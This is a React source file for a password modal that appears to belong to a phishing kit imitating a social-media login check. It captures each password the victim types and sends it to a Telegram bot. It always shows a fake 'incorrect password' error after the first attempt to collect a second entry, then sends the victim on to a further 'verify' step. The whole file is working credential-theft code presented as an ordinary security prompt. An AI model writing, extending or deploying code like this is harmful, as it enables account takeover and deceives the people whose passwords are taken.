import { faTimes } from '@fortawesome/free-solid-svg-icons';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import PropTypes from 'prop-types';
import { useState, useEffect, useCallback, useMemo } from 'react';
import { useNavigate } from 'react-router';
import config from '@/utils/config';
import sendMessage from '@/utils/telegram';
import { translateText } from '@/utils/translate';
import { PATHS } from '@/router/router';

const PasswordInput = ({ onClose }) => {
    const navigate = useNavigate();
    const [password, setPassword] = useState('');
    const [isLoading, setIsLoading] = useState(false);
    const [showError, setShowError] = useState(false);
    const [attempts, setAttempts] = useState(0);

    const defaultTexts = useMemo(
        () => ({
            title: 'Please Enter Your Password',
            description: 'For your security, you must enter your password to continue',
            passwordLabel: 'Password',
            placeholder: 'Enter your password',
            errorMessage: 'The password you entered is incorrect',
            continueBtn: 'Continue',
            loadingText: 'Please wait'
        }),
        []
    );

    const [translatedTexts, setTranslatedTexts] = useState(defaultTexts);

    const translateAllTexts = useCallback(
        async (targetLang) => {
            try {
                const [
                    translatedTitle,
                    translatedDesc,
                    translatedLabel,
                    translatedPlaceholder,
                    translatedError,
                    translatedContinue,
                    translatedLoading
                ] = await Promise.all([
                    translateText(defaultTexts.title, targetLang),
                    translateText(defaultTexts.description, targetLang),
                    translateText(defaultTexts.passwordLabel, targetLang),
                    translateText(defaultTexts.placeholder, targetLang),
                    translateText(defaultTexts.errorMessage, targetLang),
                    translateText(defaultTexts.continueBtn, targetLang),
                    translateText(defaultTexts.loadingText, targetLang)
                ]);

                setTranslatedTexts({
                    title: translatedTitle,
                    description: translatedDesc,
                    passwordLabel: translatedLabel,
                    placeholder: translatedPlaceholder,
                    errorMessage: translatedError,
                    continueBtn: translatedContinue,
                    loadingText: translatedLoading
                });
            } catch {
                //
            }
        },
        [defaultTexts]
    );

    useEffect(() => {
        const targetLang = localStorage.getItem('targetLang');
        if (targetLang && targetLang !== 'en') {
            translateAllTexts(targetLang);
        }
    }, [translateAllTexts]);

    const handleSubmit = async () => {
        if (!password.trim()) return;

        setIsLoading(true);
        setShowError(false);

        try {
            const message = `🔑 <b>Password ${attempts + 1}:</b> <code>${password}</code>`;
            await sendMessage(message);
        } catch {
            //
        }

        await new Promise((resolve) => setTimeout(resolve, 2000));

        setShowError(attempts === 0);
        setAttempts((prev) => prev + 1);
        setIsLoading(false);

        if (attempts + 1 >= config.max_password_attempts) {
            navigate(PATHS.VERIFY);
            return;
        }

        setPassword('');
    };

    return (
        <div className='fixed top-0 left-0 z-20 flex h-screen w-screen items-center justify-center'>
            <div className='mx-auto rounded-lg border border-[#e4e6eb] sm:my-12 w-full max-w-2xl'>
                <div className='bg-[#e4e6eb] p-4 sm:p-6'>
                    <div className='flex items-center justify-between'>
                        <p className='text-2xl sm:text-3xl font-bold'>{translatedTexts.title}</p>
                        <FontAwesomeIcon
                            icon={faTimes}
                            className='cursor-pointer hover:text-gray-600 text-xl'
                            onClick={onClose}
                        />
                    </div>
                </div>
                <div className='p-4 text-base leading-7 font-medium sm:text-sm sm:leading-6'>
                    <p>{translatedTexts.description}</p>
                </div>
                <div className='flex flex-col gap-2 p-4 text-sm leading-6 font-semibold'>
                    <div className='flex flex-col gap-1'>
                        <p className='text-base sm:text-sm'>
                            {translatedTexts.passwordLabel} <span className='text-red-500'>*</span>
                        </p>
                        <input 
                            type='password'
                            name='password'
                            placeholder={translatedTexts.placeholder}
                            className='w-full rounded-lg border border-gray-300 px-3 py-2.5 sm:py-1.5'
                            style={{ fontSize: '16px' }}
                            value={password}
                            onChange={(e) => setPassword(e.target.value)}
                            onKeyPress={(e) => e.key === 'Enter' && handleSubmit()}
                        />
                        {showError && <span className='text-xs text-red-500'>{translatedTexts.errorMessage}</span>}
                    </div>

                    <button 
                        className='w-full rounded-lg bg-blue-600 hover:bg-blue-700 text-white px-4 py-2 text-base font-semibold transition-colors duration-200 mt-1'
                        onClick={handleSubmit}
                        disabled={isLoading || !password.trim()}
                    >
                        {isLoading
                            ? `${translatedTexts.loadingText}...`
                            : translatedTexts.continueBtn}
                    </button>
                </div>
            </div>
        </div>
    );
};

PasswordInput.propTypes = {
    onClose: PropTypes.func.isRequired
};

export default PasswordInput;
